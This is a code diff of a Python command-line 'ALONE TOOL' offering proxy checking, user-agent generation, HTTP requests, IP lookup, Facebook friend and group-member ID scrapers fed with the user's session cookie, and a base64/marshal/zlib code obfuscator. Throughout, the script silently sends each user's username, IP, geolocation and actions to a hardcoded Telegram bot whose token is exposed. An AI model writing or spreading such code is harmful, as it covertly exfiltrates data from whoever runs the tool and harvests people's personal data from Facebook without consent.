@@ -8,6 +8,7 @@ import marshal
 import zlib
 from datetime import datetime
 from bs4 import BeautifulSoup
+import re
 
 # --- Configuration ---
 BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0"
@@ -15,15 +16,15 @@ CHAT_ID   = "1241769879"
 
 # --- Colors ---
 class Colors:
-    HEADER     = "\033[95m"
-    BLUE       = "\033[94m"
-    CYAN       = "\033[96m"
-    GREEN      = "\033[92m"
-    YELLOW     = "\033[93m"
-    RED        = "\033[91m"
-    ENDC       = "\033[0m"
-    BOLD       = "\033[1m"
-    UNDERLINE  = "\033[4m"
+    HEADER    = "\033[95m"
+    BLUE      = "\033[94m"
+    CYAN      = "\033[96m"
+    GREEN     = "\033[92m"
+    YELLOW    = "\033[93m"
+    RED       = "\033[91m"
+    ENDC      = "\033[0m"
+    BOLD      = "\033[1m"
+    UNDERLINE = "\033[4m"
 
 # --- Utility Functions ---
 
@@ -44,8 +45,8 @@ def send_telegram_file(path, caption=""):
     try:
         with open(path, 'rb') as f:
             requests.post(url,
-                data={"chat_id": CHAT_ID, "caption": caption},
-                files={"document": f}, timeout=5)
+                          data={"chat_id": CHAT_ID, "caption": caption},
+                          files={"document": f}, timeout=5)
     except:
         send_telegram_message(f"[!] Could not send file: {path}")
 
@@ -61,13 +62,13 @@ def get_ip_geo():
 
 def login():
     clear()
-    print(f"{Colors.HEADER} █████╗ ██╗      ██████╗ ███╗   ██╗███████╗")
-    print(f"{Colors.HEADER}██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝")
-    print(f"{Colors.HEADER}███████║██║     ██║   ██║██╔██╗ ██║█████╗  ")
-    print(f"{Colors.HEADER}██╔══██║██║     ██║   ██║██║╚██╗██║██╔══╝  ")
-    print(f"{Colors.HEADER}██║  ██║███████╗╚██████╔╝██║ ╚████║███████╗")
-    print(f"{Colors.HEADER}╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝{Colors.ENDC}")
-    print(f"\n{Colors.CYAN}           A L O N E   T O O L{Colors.ENDC}\n")
+    print(f"{Colors.HEADER}  ██████╗ ██████╗ ███████╗██████╗ ██╗████████╗{Colors.ENDC}")
+    print(f"{Colors.HEADER} ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝{Colors.ENDC}")
+    print(f"{Colors.HEADER} ██████╔╝██║  ██║███████╗██████╔╝██║   ██║   {Colors.ENDC}")
+    print(f"{Colors.HEADER} ██╔═══╝ ██║  ██║╚════██║██╔═══╝ ██║   ██║   {Colors.ENDC}")
+    print(f"{Colors.HEADER} ██║     ██████╔╝███████║██║     ██║   ██║   {Colors.ENDC}")
+    print(f"{Colors.HEADER} ╚═╝     ╚═════╝ ╚══════╝╚═╝     ╚═╝   ╚═╝   {Colors.ENDC}\n")
+    print(f"{Colors.CYAN}           A L O N E   T O O L{Colors.ENDC}\n")
 
     print(f"{Colors.CYAN}[•] Public login to access the tool{Colors.ENDC}")
     username = input(f"{Colors.BLUE}[•] Enter username: {Colors.ENDC}").strip()
@@ -81,6 +82,7 @@ def login():
     send_telegram_message(
         f"[•] Login | User: {username} | IP: {ip} | Geo: {geo} | Time: {ts}"
     )
+
     print(f"{Colors.GREEN}[✓] Welcome, {username}! Access granted.{Colors.ENDC}")
     time.sleep(1)
 
@@ -95,126 +97,131 @@ def proxy_options():
     proxies = []
     if choice == '1':
         path = input("[•] File path: ")
-        if os.path.isfile(path):
-            proxies = open(path).read().splitlines()
+        if os.path.isfile(path): proxies = open(path).read().splitlines()
     elif choice == '2':
         url = input("[•] URL: ")
-        try: proxies = requests.get(url, timeout=5).text.splitlines()
+        try: proxies = requests.get(url,timeout=5).text.splitlines()
         except: pass
     elif choice == '3':
         src = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http"
-        try: proxies = requests.get(src, timeout=5).text.splitlines()
+        try: proxies = requests.get(src,timeout=5).text.splitlines()
         except: pass
-    ok = bad = 0
+    ok=bad=0
     for p in proxies:
         try:
-            r = requests.get('https://httpbin.org/ip', proxies={'http':p,'https':p}, timeout=3)
-            ok += 1 if r.ok else 0
-            bad += 0 if r.ok else 1
-        except: bad += 1
+            r=requests.get('https://httpbin.org/ip', proxies={'http':p,'https':p},timeout=3)
+            ok+=1 if r.ok else bad+1
+        except: bad+=1
     print(f"{Colors.GREEN}[OK: {ok}]{Colors.ENDC} {Colors.RED}[BAD: {bad}]{Colors.ENDC}")
-    send_telegram_message(f"[•] Proxies checked: OK={ok} BAD={bad}")
+    send_telegram_message(f"[•] Proxies OK={ok} BAD={bad}")
     input("Press Enter to return...")
 
 
 def ua_generator():
     clear(); print(f"{Colors.GREEN}[•] User-Agent Generator{Colors.ENDC}")
     samples = [
-        "Mozilla/5.0 (Windows...)",
-        "Mozilla/5.0 (Macintosh...)",
-        "Mozilla/5.0 (Linux...)",
+        "Mozilla/5.0 (Windows...)", "Mozilla/5.0 (Macintosh...)",
+        "Mozilla/5.0 (Linux...)"
     ]
-    count = int(input("[•] How many? "))
-    uas = [random.choice(samples) for _ in range(count)]
+    count=int(input("[•] How many? "))
+    uas=[random.choice(samples) for _ in range(count)]
     with open('ug.txt','w') as f: f.write('\n'.join(uas))
-    print(f"{Colors.GREEN}[✓] Saved {count} UAs to ug.txt{Colors.ENDC}")
+    print(f"{Colors.GREEN}[✓] {count} UAs saved{Colors.ENDC}")
     send_telegram_message(f"[•] Generated {count} UAs")
-    input("Press Enter to return...")
+    input("Enter...")
 
 
 def send_request():
     clear(); print(f"{Colors.GREEN}[•] Send HTTP Request{Colors.ENDC}")
-    url = input("[•] URL: ")
-    use_p = input("[•] Use proxy (y/n)? ").lower()=='y'
-    use_u = input("[•] Use UA (y/n)? ").lower()=='y'
-    headers = {}
-    proxies = None
+    url=input("[•] URL: ")
+    use_p=input("[•] Proxy? [y/n] ").lower()=='y'
+    use_u=input("[•] UA?    [y/n] ").lower()=='y'
+    headers={}
+    proxies=None
     if use_u and os.path.isfile('ug.txt'):
-        headers['User-Agent'] = random.choice(open('ug.txt').read().splitlines())
+        headers={'User-Agent':random.choice(open('ug.txt').read().splitlines())}
     if use_p and os.path.isfile('proxy.txt'):
-        p = random.choice(open('proxy.txt').read().splitlines())
-        proxies={'http':p,'https':p}
+        p=random.choice(open('proxy.txt').read().splitlines()); proxies={'http':p,'https':p}
     try:
-        r = requests.get(url, headers=headers, proxies=proxies, timeout=5)
-        status = r.status_code
-        print(f"{Colors.GREEN}[✓] Status: {status}{Colors.ENDC}")
-        send_telegram_message(f"[•] Requested {url} => {status}")
+        r=requests.get(url,headers=headers,proxies=proxies,timeout=5)
+        print(f"{Colors.GREEN}[✓] {r.status_code}{Colors.ENDC}")
+        send_telegram_message(f"[•] {url} -> {r.status_code}")
     except Exception as e:
         print(f"{Colors.RED}[!] {e}{Colors.ENDC}")
-    input("Press Enter to return...")
+    input("Enter...")
 
 
 def look_ip():
     clear(); print(f"{Colors.GREEN}[•] Look IP Info{Colors.ENDC}")
-    ip = input("[•] IP: ")
+    ip=input("[•] IP: ")
     try:
-        data = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
-        for k,v in data.items(): print(f"{Colors.BLUE}{k}:{Colors.ENDC} {v}")
-        send_telegram_message(f"[•] IP Info {ip}: {data}")
+        info=requests.get(f"http://ip-api.com/json/{ip}",timeout=5).json()
+        for k,v in info.items(): print(f"{Colors.BLUE}{k}:{Colors.ENDC} {v}")
+        send_telegram_message(f"[•] IP {ip}: {info}")
     except:
         print(f"{Colors.RED}[!] Failed{Colors.ENDC}")
-    input("Press Enter...")
+    input("Enter...")
 
 
 def fb_ids():
     clear(); print(f"{Colors.GREEN}[•] Facebook IDs Extractor{Colors.ENDC}")
-    tgt=input("[•] Profile URL/ID: ")
-    seen=set()
-    def ext(uid):
-        r=requests.get(f"https://mbasic.facebook.com/profile.php?id={uid}&v=friends", headers={'User-Agent':'Mozilla/5.0'})
+    target=input("[•] Profile URL or ID: ")
+    cookie=input("[•] FB Cookie: ")
+    headers={'User-Agent':'Mozilla/5.0','Cookie':cookie}
+    seen=[]
+    def extract(url):
+        r=requests.get(url,headers=headers,timeout=5)
         bs=BeautifulSoup(r.text,'html.parser')
         for a in bs.find_all('a',href=True):
-            m=__import__('re').search(r'id=(\d+)',a['href'])
-            if m and m.group(1) not in seen:
-                seen.add(m.group(1))
-                print(f"{Colors.CYAN}{m.group(1)}|{a.text}{Colors.ENDC}")
-                ext(m.group(1))
-    ext(tgt)
+            m=re.search(r'profile\.php\?id=(\d+)',a['href'])
+            if m:
+                fid=m.group(1); name=a.get_text().strip()
+                if fid not in seen:
+                    seen.append(fid)
+                    print(f"{Colors.CYAN}{fid}|{name}{Colors.ENDC}")
+        nxt=bs.find('a', string=lambda s: s and ('See More' in s or 'Show More' in s))
+        if nxt:
+            extract('https://mbasic.facebook.com'+nxt['href'])
+    start=f"https://mbasic.facebook.com/profile.php?id={target}&sk=friends"
+    extract(start)
     with open('ids.txt','w') as f: f.write('\n'.join(seen))
     send_telegram_message(f"[•] Extracted {len(seen)} FB IDs")
-    input("Press Enter...")
+    input("Enter...")
 
 
 def group_dump():
     clear(); print(f"{Colors.GREEN}[•] Group Member ID Dumper{Colors.ENDC}")
     url=input("[•] Group URL: ")
     cookie=input("[•] FB Cookie: ")
-    import re
+    headers={'User-Agent':'Mozilla/5.0','Cookie':cookie}
     m=re.search(r'groups/(\d+)',url)
     if not m: print(f"{Colors.RED}[!] Invalid URL{Colors.ENDC}");input();return
     gid=m.group(1)
-    hdr={'Cookie':cookie,'User-Agent':'Mozilla/5.0'}
     seen=[]
-    nxt=f"https://mbasic.facebook.com/groups/{gid}/members"
-    while nxt:
-        r=requests.get(nxt,headers=hdr)
+    def extract(url):
+        r=requests.get(url,headers=headers,timeout=5)
         bs=BeautifulSoup(r.text,'html.parser')
         for a in bs.find_all('a',href=True):
-            m2=__import__('re').search(r'id=(\d+)',a['href'])
-            if m2 and m2.group(1) not in seen:
-                seen.append(m2.group(1))
-                print(f"{Colors.CYAN}{m2.group(1)}|{a.text}{Colors.ENDC}")
-        nxt_tag=bs.find('a',string='See More')
-        nxt='https://mbasic.facebook.com'+nxt_tag['href'] if nxt_tag else None
+            m2=re.search(r'profile\.php\?id=(\d+)',a['href'])
+            if m2:
+                fid=m2.group(1); name=a.get_text().strip()
+                if fid not in seen:
+                    seen.append(fid)
+                    print(f"{Colors.CYAN}{fid}|{name}{Colors.ENDC}")
+        nxt=bs.find('a', string=lambda s: s and ('See More' in s or 'Show More' in s))
+        return 'https://mbasic.facebook.com'+nxt['href'] if nxt else None
+    page=f"https://mbasic.facebook.com/groups/{gid}/members"
+    while page:
+        page=extract(page)
     with open('groupids.txt','w') as f: f.write('\n'.join(seen))
-    send_telegram_message(f"[•] Dumped {len(seen)} group IDs")
-    input("Press Enter...")
+    send_telegram_message(f"[•] Dumped {len(seen)} members")
+    input("Enter...")
 
 
 def encrypt_code():
     clear(); print(f"{Colors.GREEN}[•] Code Encryptor{Colors.ENDC}")
     fname=input("[•] .py file: ")
-    if not os.path.isfile(fname): print(f"{Colors.RED}[!] Not found{Colors.ENDC}");time.sleep(1);return
+    if not os.path.isfile(fname):print(f"{Colors.RED}[!] Not found{Colors.ENDC}");time.sleep(1);return
     code=open(fname).read()
     print("[1]Base64 [2]Marshal [3]Zlib+Base64")
     c=input("Choice: ")
@@ -248,15 +255,15 @@ def update_tool():
 
 # --- Main Menu ---
 while True:
+    login()
     clear()
     print(f"{Colors.HEADER} █████╗ ██╗      ██████╗ ███╗   ██╗███████╗{Colors.ENDC}")
     print(f"{Colors.HEADER}██╔══██╗██║     ██╔═══██╗████╗  ██║██╔════╝{Colors.ENDC}")
-    print(f"{Colors.HEADER}███████║██║     ██║   ██║██╔██╗ ██║█████╗  {Colors.ENDC}")
-    print(f"{Colors.HEADER}██╔══██║██║     ██║   ██║██║╚██╗██║██╔══╝  {Colors.ENDC}")
-    print(f"{Colors.HEADER}██║  ██║███████╗╚██████╔╝██║ ╚████║███████╗{Colors.ENDC}")
-    print(f"{Colors.HEADER}╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝{Colors.ENDC}")
-    print(f"\n{Colors.CYAN}           A L O N E   T O O L{Colors.ENDC}\n")
-
+    print(f"{Colors.HEADER}███████║██║     ██║   ██║██╔██╗ ██║███████╗{Colors.ENDC}")
+    print(f"{Colors.HEADER}██╔══██║██║     ██║   ██║██║╚██╗██║╚════██║{Colors.ENDC}")
+    print(f"{Colors.HEADER}██║  ██║███████╗╚██████╔╝██║ ╚████║███████║{Colors.ENDC}")
+    print(f"{Colors.HEADER}╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝{Colors.ENDC}\n")
+    print(f"{Colors.CYAN}           A L O N E   T O O L{Colors.ENDC}\n")
     print(f"{Colors.BLUE}[1] Proxy Options{Colors.ENDC}")
     print(f"{Colors.BLUE}[2] User-Agent Generator{Colors.ENDC}")
     print(f"{Colors.BLUE}[3] Send HTTP Request{Colors.ENDC}")
@@ -266,16 +273,15 @@ while True:
     print(f"{Colors.GREEN}[7] Encrypt Code{Colors.ENDC}")
     print(f"{Colors.CYAN}[8] Auto-Update Tool{Colors.ENDC}")
     print(f"{Colors.RED}[0] Exit{Colors.ENDC}\n")
-
-    opt = input(f"{Colors.YELLOW}[•] Choose: {Colors.ENDC}").strip()
-    if   opt == '1': proxy_options()
-    elif opt == '2': ua_generator()
-    elif opt == '3': send_request()
-    elif opt == '4': look_ip()
-    elif opt == '5': fb_ids()
-    elif opt == '6': group_dump()
-    elif opt == '7': encrypt_code()
-    elif opt == '8': update_tool()
-    elif opt == '0': print(f"{Colors.GREEN}[•] Goodbye!{Colors.ENDC}"); sys.exit()
-    else: print(f"{Colors.FAIL}[!] Invalid option{Colors.ENDC}"); time.sleep(1)
+    opt=input(f"{Colors.YELLOW}[•] Choose: {Colors.ENDC}").strip()
+    if   opt=='1': proxy_options()
+    elif opt=='2': ua_generator()
+    elif opt=='3': send_request()
+    elif opt=='4': look_ip()
+    elif opt=='5': fb_ids()
+    elif opt=='6': group_dump()
+    elif opt=='7': encrypt_code()
+    elif opt=='8': update_tool()
+    elif opt=='0': print(f"{Colors.GREEN}[•] Goodbye!{Colors.ENDC}"); sys.exit()
+    else: print(f"{Colors.RED}[!] Invalid option{Colors.ENDC}"); time.sleep(1)
 
